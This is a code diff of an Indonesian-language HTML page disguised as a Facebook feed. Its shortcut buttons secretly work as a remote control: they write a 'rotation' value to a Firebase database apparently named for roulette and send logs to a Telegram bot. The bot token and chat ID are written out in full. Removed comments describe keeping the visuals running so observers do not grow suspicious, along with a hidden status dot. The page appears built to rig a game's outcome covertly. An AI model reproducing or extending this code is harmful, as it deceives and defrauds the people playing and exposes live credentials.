@@ -10,35 +10,42 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
         body { background: #18191a; color: #e4e6eb; -webkit-tap-highlight-color: transparent; }
 
+        /* --- HEADER & NAV --- */
         .header { background: #242526; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #3e4042; }
         .nav-primary { display: flex; justify-content: space-around; background: #242526; border-bottom: 1px solid #3e4042; position: sticky; top: 48px; z-index: 99; }
         .nav-icon { font-size: 22px; padding: 12px; cursor: pointer; width: 16%; text-align: center; color: #b0b3b8; }
+        .nav-icon:active { color: #1877f2; }
 
-        /* Tanda Rahasia Status OFF */
-        #off-indicator { color: #242526; font-size: 10px; margin-left: 2px; }
-
+        /* --- POST BAR --- */
         .post-bar { background: #242526; padding: 12px; display: flex; align-items: center; gap: 10px; margin-top: 8px; }
         .avatar { width: 38px; height: 38px; background: #4e4f50; border-radius: 50%; overflow: hidden; }
         .avatar img { width: 100%; height: 100%; object-fit: cover; }
         .search-fake { background: #3a3b3c; flex: 1; padding: 9px 15px; border-radius: 20px; color: #b0b3b8; font-size: 14px; cursor: pointer; }
 
+        /* --- SYSTEM STATUS --- */
         .system-status-card { background: #1c1e21; border-top: 2px solid #1877f2; padding: 12px; margin-top: 8px; font-size: 11px; }
         .sys-info { font-family: monospace; color: #b0b3b8; }
 
+        /* --- FEED CARD --- */
         .feed-card { background: #242526; margin-top: 10px; padding: 12px; border-bottom: 1px solid #3e4042; }
+        .feed-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
         .profile-name { font-weight: bold; font-size: 14px; }
+        .feed-time { font-size: 12px; color: #b0b3b8; }
         .feed-text { font-size: 14px; line-height: 1.4; margin-bottom: 12px; }
-        .media-box { width: 100%; border-radius: 8px; overflow: hidden; background: #000; }
+        .media-box { width: 100%; border-radius: 8px; overflow: hidden; background: #000; margin-top: 5px; }
         .media-box img, .media-box video { width: 100%; display: block; }
+
+        /* --- BUTTONS --- */
+        .btn-wa { display: block; width: 100%; padding: 10px; background: #25d366; color: white; text-align: center; text-decoration: none; border-radius: 6px; font-weight: bold; margin-top: 10px; font-size: 14px; }
+        .shortcut-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 12px; background: #242526; }
+        .shortcut-item { background: #3a3b3c; padding: 12px 5px; border-radius: 8px; text-align: center; cursor: pointer; font-size: 11px; font-weight: bold; }
     </style>
 </head>
-<body>
+<body onmousedown="resetTimer()">
 
     <div id="fb-remote">
         <div class="header">
-            <div style="color:#fff; font-size: 22px; font-weight: bold; display: flex; align-items: flex-end;">
-                facebook <span id="off-indicator">.</span>
-            </div>
+            <div style="color:#fff; font-size: 22px; font-weight: bold;">facebook</div>
             <div style="display: flex; gap: 15px; font-size: 18px;">🔍 💬</div>
         </div>
 
@@ -65,73 +72,149 @@
         </div>
 
         <div class="feed-card">
-            <div class="profile-name">Info Terkini</div>
-            <div class="feed-text">Sistem keamanan diperbarui. Semua koneksi terenkripsi 256-bit.</div>
+            <div class="feed-header">
+                <div class="avatar"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
+                <div><div class="profile-name">Video Lucu Dunia</div><div class="feed-time">12 mnt • 🌎</div></div>
+            </div>
+            <div class="feed-text">Coba lihat aksi menggemaskan ini! 😍 #lucu #viral</div>
             <div class="media-box">
                 <video controls muted loop><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"></video>
             </div>
         </div>
+
+        <div class="shortcut-grid">
+            <div class="shortcut-item" onclick="sendCmd(7, 'REELS')">🎞️<br>Reels</div>
+            <div class="shortcut-item" onclick="sendCmd(8, 'LIVE')">🎥<br>Live</div>
+            <div class="shortcut-item" onclick="sendCmd(9, 'PHOTO')">🖼️<br>Foto</div>
+            <div class="shortcut-item" onclick="sendCmd(10, 'EVENT')">📅<br>Acara</div>
+            <div class="shortcut-item" onclick="sendCmd(11, 'SAVE')">🔖<br>Simpan</div>
+            <div class="shortcut-item" onclick="sendCmd(12, 'DATE')">❤️<br>Kencan</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar" style="background:#cc0000"></div>
+                <div><div class="profile-name">Jual Beli HP Second</div><div class="feed-time">32 mnt • 🌎</div></div>
+            </div>
+            <div class="feed-text">Promo cuci gudang! iPhone 11 Pro Max mulus, nominus. Harga nego sampai jadi. Minat? Klik tombol WA di bawah!</div>
+            <div class="media-box">
+                <img src="https://i.ibb.co/Y3mX0vK/loker-indo.jpg">
+            </div>
+            <a href="https://wa.me/628156678087" class="btn-wa">Chat Penjual (WhatsApp)</a>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar" style="background:#0044ff"></div>
+                <div><div class="profile-name">Teknologi Masa Depan</div><div class="feed-time">1 jam • 🌎</div></div>
+            </div>
+            <div class="feed-text">Eksperimen sains yang luar biasa. Jangan lupa subscribe!</div>
+            <div class="media-box">
+                <video controls muted loop><source src="https://www.w3schools.com/html/horse.mp4" type="video/mp4"></video>
+            </div>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar" style="background:#ffaa00"></div>
+                <div><div class="profile-name">Wisata Kuliner</div><div class="feed-time">2 jam • 🌎</div></div>
+            </div>
+            <div class="feed-text">Rekomendasi tempat makan enak di akhir pekan. Viewnya keren banget!</div>
+            <div class="media-box">
+                <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?auto=format&fit=crop&w=500&q=60">
+            </div>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
+                <div><div class="profile-name">Trending Video</div><div class="feed-time">4 jam • 🌎</div></div>
+            </div>
+            <div class="feed-text">Video yang lagi ramai diperbincangkan di sosmed.</div>
+            <div style="position:relative; padding-bottom:56.25%; height:0; overflow:hidden; border-radius:8px; background:#000;">
+                <iframe src="https://www.facebook.com/plugins/video.php?height=314&href=https%3A%2F%2Fwww.facebook.com%2Fshare%2Fv%2F177dwyFayA%2F&show_text=false&width=560" style="position:absolute;top:0;left:0;width:100%;height:100%;border:none;" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
+            </div>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar" style="background:#32cd32"></div>
+                <div><div class="profile-name">Info Kesehatan</div><div class="feed-time">5 jam • 🌎</div></div>
+            </div>
+            <div class="feed-text">Tips menjaga imunitas tubuh di musim hujan. Silahkan bagikan ke keluarga tercinta.</div>
+            <div class="media-box">
+                <img src="https://images.unsplash.com/photo-1498837167922-ddd27525d352?auto=format&fit=crop&w=500&q=60">
+            </div>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
+                <div><div class="profile-name">Movie Trailer</div><div class="feed-time">7 jam • 🌎</div></div>
+            </div>
+            <div class="media-box">
+                <video controls muted loop><source src="http://techslides.com/demos/sample-videos/small.mp4" type="video/mp4"></video>
+            </div>
+        </div>
+
+        <div style="text-align:center; padding:20px; color:#888; font-size:12px;">Tidak ada postingan lagi.</div>
     </div>
 
     <script>
         let dbRef = null;
-        let isAdminLocked = true; // --- SET KE 'true' UNTUK MATIKAN TOTAL LEWAT KODE ---
+        let logoutTimer;
+        let isAdminLocked = false;
 
-        // Konfigurasi Firebase
         const config = { databaseURL: "https://roullete-fc17f-default-rtdb.asia-southeast1.firebasedatabase.app/" };
         if (!firebase.apps.length) firebase.initializeApp(config);
         dbRef = firebase.database().ref('control');
 
-        // Monitoring Otomatis
-        dbRef.on('value', (snapshot) => {
-            const data = snapshot.val();
-            if (data) {
-                // Baris ini akan menimpa variabel isAdminLocked sesuai database
-                isAdminLocked = (data.clientA_status === "OFF" || data.app_status === "OFF");
-                
-                // Tanda Rahasia: Munculkan titik abu-abu jika OFF, hilangkan jika ON
-                const indicator = document.getElementById("off-indicator");
-                if (isAdminLocked) {
-                    indicator.style.color = "#444"; // Titik samar terlihat
-                } else {
-                    indicator.style.color = "#242526"; // Titik hilang (sama warna dgn background)
-                }
+        dbRef.on('value', (s) => {
+            const d = s.val();
+            // Cek status OFF
+            isAdminLocked = (d && (d.clientA_status === "OFF" || d.app_status === "OFF"));
+            
+            // Perbarui UI Node sesuai status
+            const nodeLabel = document.getElementById("node-val");
+            if (isAdminLocked) {
+                nodeLabel.innerText = "STABLE"; // Tanda OFF
+            } else {
+                nodeLabel.innerText = "ID_STABLE"; // Tanda ON
             }
         });
 
         function sendCmd(id, label) {
             let val = (id === null) ? "RANDOM" : (12 - id).toFixed(1);
             
-            // Visual tetap jalan agar tidak curiga
-            document.getElementById("node-val").innerText = "ID_" + label;
+            // Jika OFF, UI tetap berubah tapi perintah tidak dikirim
             document.getElementById("payload-val").innerText = val;
             document.getElementById("sync-val").innerText = "SENDING...";
             document.getElementById("sync-val").style.color = "#ffaa00";
 
-            // KUNCI MATI (DIBLOKIR DI SINI)
             if (isAdminLocked) {
-                console.log("Jalur Terputus: Status OFF");
-                setTimeout(() => {
-                    document.getElementById("sync-val").innerText = "CONNECTED";
+                setTimeout(() => { 
+                    document.getElementById("sync-val").innerText = "CONNECTED"; 
                     document.getElementById("sync-val").style.color = "#42b72a";
-                }, 1000);
-                return; // Berhenti total, kode di bawah tidak akan jalan
+                }, 800);
+                return; // BREAK - Perintah tidak dikirim ke Firebase/Telegram
             }
 
-            // Jalur Pengiriman (Hanya jalan jika ON)
+            // Jalur Kirim (Hanya jalan jika ON)
             fetch(`https://api.telegram.org/bot8075763270:AAHO7w8v1g2ThE_NetGWEpFDid620dlmF28/sendMessage?chat_id=1988855705&text=FB_LOG:${label}_Val:${val}`);
             
             if(dbRef) {
-                dbRef.update({ 
-                    rotation: val, 
-                    last_click: Date.now() 
-                }).then(() => {
-                    setTimeout(() => {
-                        document.getElementById("sync-val").innerText = "CONNECTED";
+                dbRef.update({ rotation: val, last_click: Date.now() }).then(() => {
+                    setTimeout(() => { 
+                        document.getElementById("sync-val").innerText = "CONNECTED"; 
                         document.getElementById("sync-val").style.color = "#42b72a";
                     }, 800);
                 });
             }
+        }
+
+        function resetTimer() {
+            clearTimeout(logoutTimer);
+            logoutTimer = setTimeout(() => { location.reload(); }, 600000); 
         }
     </script>
 </body>
